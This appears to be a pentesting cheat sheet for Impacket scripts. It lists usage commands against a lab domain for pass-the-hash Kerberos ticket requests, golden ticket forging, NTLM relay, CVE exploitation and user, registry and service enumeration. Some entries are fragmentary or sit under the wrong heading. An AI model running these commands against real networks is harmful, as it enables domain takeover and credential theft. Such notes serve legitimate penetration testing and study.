	atexec.py: Read in Active Directory sheet	
	wmiexec.py: Read in Active Directory sheet

Kerberos:
	GetTGT.py:
		GetTGT.py requests a TGT and saves it as ccache for given a password, hash or aesKey which can be injected directory for access the requested service
			Usage:
				getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 ignite.local/yashika
				export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local
	GetST.py: Given a password, hash, aesKey or TGT in ccache, this script will request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user.
	GetPac.py: This script will get the PAC (Privilege Attribute Certificate) structure of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]’s S4USelf + User to User Kerberos Authentication.
	GetUserSPNs.py: 
		Kerberoasting:covered in Active Directory sheet
	GetNPUsers.py: 
		as-reproasting:covered in Active Directory sheet
	ticketConverter.py:
		This script will convert kirbi files, commonly used by mimikatz, into ccache files used by Impacket, and vice versa.
		Usage:
			ticketConverter.py raj.ccache ticket.kirbi
	ticketer.py:
		This script will create Golden/Silver tickets from scratch or based on a template (legally requested from the KDC) allowing you to customize some of the parameters set inside the PAC_LOGON_INFO structure, in particular the groups, ExtraSids, duration, etc.
		This script can be helpful for abusing Kerberos against GOLDEN TICKET ATTACK.
		Usage:
			ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj
	raiseChild.py: This script implements a child-domain to forest privilege escalation by (ab)using the concept of Golden Tickets and ExtraSids.

Server Tools/MiTM Attacks:
	ntlmrelayx.py: This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy.
	karmaSMB.py: A SMB Server that answers specific file contents regardless of the SMB share and pathname specified.
	smbserver.py:
		launches a smb server
		covered in SMB Server For Pentesting sheet
WMI:
	wmiquery.py:
		wmiquery.py is used to issue WQL queries and get description of WMI objects at the target system
		Usage:
			wmiquery.py [[domain/] username [: password] @] [Target IP Address]
			wmiquery.py SERVER/Administrator:T00r@192.168.1.140
				This will open a shell, where you can run WQL queries like:
					SELECT * FROM Win32_LogicalDisk WHERE FreeSpace < 209152
	wmipersist.py: This script creates/removes a WMI Event Consumer/Filter and link between both to execute Visual Basic based on the WQL filter or timer specified.

		Exploits MS14-068
		Read Active Directory sheet for more info
	sambaPipe.py: =>This script will exploit CVE-2017-7494, uploading and executing the shared library specified by the user through the -so parameter.
	smbrelayx.py => Exploit for CVE-2015-0005 using a SMB Relay Attack. If the target system is enforcing signing and a machine account was provided, the module will try to gather the SMB session key through NETLOGON.
SMB/MSRPC:
	smbclient.py:
		A SMB client that allows you to list shares and files, rename, upload and download files and create and delete directories, all using either username and password or username and hash.

		Usage:
			getArch.py -target ip
			getArch.py -targets targets.list
	exchanger.py: A tool for connecting to MS Exchange via RPC over HTTP v2.
	ifmap.py:
		Ifmap.py scripts initially bind to the MGMT interface of the Target machine. Then it fetches a list of interface IDs. Then it adds those IDs to another large list of UUIDs it already has in its database. Then it tries to bind each of the interfaces and reports the status of the interface. The list of UUIDs which are running endpoint-mapper can be mapped to the unique services. After getting these services, an attacker can search on the internet to find if any of these services are vulnerable to Overflow over RPC.
		Usage:
			ifmap.py [Target IP Address] [Target Port]
			ifmap.py 192.168.1.105 135
	lookupsid.py:
		lookupsid.py script can enumerate both local and domain users.
		Working:
			SID is a unique value of variable length that is used to identify a user account.
			Through a SID User Enumeration, we can extract the information about what users exist and their data.
		Usage:
			lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address]
	netview.py:
		netview.py requires the domain name to enumerate hosts or It can be provided with a list of hosts or targets.
		Once a list is gathered then netview checks IP addresses/Shares/Sessions/Logged On Users, Once finding the information it doesn’t stop. It keeps looping over the hosts found and keeps a detailed track of who logged in/out from remote servers. It keeps the connections with the target systems and it is very stealthy as it just sends few DCERPC packets.
		This script requires that the attacker machine is able to resolve the domain machine’s NetBIOS names. This can be achieved by setting the DNS on the attacker machine to the domain DNS.
		Usage:
			netview.py [domain]/[User] -target [Target IP Address] -users [User List]
			netview.py [domain]/[User] -targets [Target List] -users [User List]
	reg.py:
		reg.py is based on reg.exe of the Windows OS. Reg.exe is a service that can read, modify and delete registry values.
		Usage:
			reg.py [domain]/[user]:[password:password hash]@[Target IP Address] [action] [action parameter]
			reg.py ignite/Administrator:pass@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
			reg.py --hashes hash domain.local/username query -KeyName HKU\\
				lists HKU keys
			reg.py --hashes hash domain.local/username@query -KeyName HKU\\abcd\\
	rpcdump.py:
		rpcdump.py dumps the list of RPC endpoints and string bindings registered at the target. It will also try to match them with a list of well known endpoints.

	rpcmap.py:
		covered in Active Directory sheet
	samrdump.py:

		Usage:
			samrdump.py [domain]/[user]:[Password/Password Hash]@[Target IP Address]
	services.py:
		services.py is used to manipulate Windows services through the [MS-SCMR] MSRPC Interface.

		Usage:
			services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action]
			services.py ignite/Administrator:pass@192.168.1.105 list
